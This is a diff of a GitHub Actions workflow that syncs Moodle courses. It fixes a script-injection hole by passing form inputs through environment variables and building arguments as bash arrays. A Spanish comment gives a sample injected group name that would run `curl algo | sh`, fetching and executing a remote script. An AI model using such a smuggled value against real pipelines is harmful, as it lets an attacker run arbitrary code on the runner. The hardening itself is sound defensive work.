@@ -75,25 +75,44 @@ jobs:
           MOODLE_PASSWORD: ${{ secrets.MOODLE_PASSWORD }}
           NP_NTLM_USER: ${{ secrets.NP_NTLM_USER }}
           NP_NTLM_PASSWORD: ${{ secrets.NP_NTLM_PASSWORD }}
+
+          # Lo que se escribe en el formulario de "Run workflow" entra por acá
+          # y no por el script. La diferencia importa: `${{ ... }}` lo sustituye
+          # GitHub ANTES de que bash vea la línea, así que el texto se vuelve
+          # parte del programa. Un grupo llamado `x"; curl algo | sh; #` se
+          # ejecutaría. Como variable de entorno, en cambio, es sólo un dato:
+          # bash ya terminó de leer el script cuando lo consulta.
+          EVENTO: ${{ github.event_name }}
+          ENTRADA_COMMIT: ${{ inputs.commit }}
+          ENTRADA_ALLOW_UPDATE: ${{ inputs.allow_update }}
+          ENTRADA_GRUPO: ${{ inputs.group }}
+          ENTRADA_CURSO: ${{ inputs.course }}
         run: |
           set -o pipefail
 
+          # Los argumentos se arman en arreglos, no concatenando texto: así
+          # cada elemento llega a mnsync como un argumento y uno solo, sin
+          # depender de que bash lo parta por los espacios.
+
           # La corrida programada escribe; la manual, solo si se lo pidieron.
-          if [ "${{ github.event_name }}" = "schedule" ]; then
-            COMMIT="--commit"
-          elif [ "${{ inputs.commit }}" = "true" ]; then
-            COMMIT="--commit"
-          else
-            COMMIT=""
+          COMMIT=()
+          if [ "$EVENTO" = "schedule" ] || [ "$ENTRADA_COMMIT" = "true" ]; then
+            COMMIT=(--commit)
           fi
 
-          EXTRA=""
-          [ "${{ inputs.allow_update }}" = "true" ] && EXTRA="$EXTRA --allow-update"
-          [ -n "${{ inputs.group }}" ] && EXTRA="$EXTRA --group ${{ inputs.group }}"
+          EXTRA=()
+          if [ "$ENTRADA_ALLOW_UPDATE" = "true" ]; then
+            EXTRA+=(--allow-update)
+          fi
+          # Entre comillas y como un solo elemento: los grupos de Moodle se
+          # llaman "Grupo 01" y antes se partían en dos argumentos sueltos.
+          if [ -n "$ENTRADA_GRUPO" ]; then
+            EXTRA+=(--group "$ENTRADA_GRUPO")
+          fi
 
           # Cursos a procesar: el indicado, o todos los de courses.yml.
-          if [ -n "${{ inputs.course }}" ]; then
-            CURSOS="${{ inputs.course }}"
+          if [ -n "$ENTRADA_CURSO" ]; then
+            CURSOS="$ENTRADA_CURSO"
           else
             CURSOS=$(python -c "
           import yaml
@@ -105,7 +124,7 @@ jobs:
           for curso in $CURSOS; do
             echo "::group::Curso $curso"
             set +e
-            mnsync sync --course "$curso" $COMMIT $EXTRA
+            mnsync sync --course "$curso" "${COMMIT[@]}" "${EXTRA[@]}"
             CODIGO=$?
             set -e
             echo "::endgroup::"
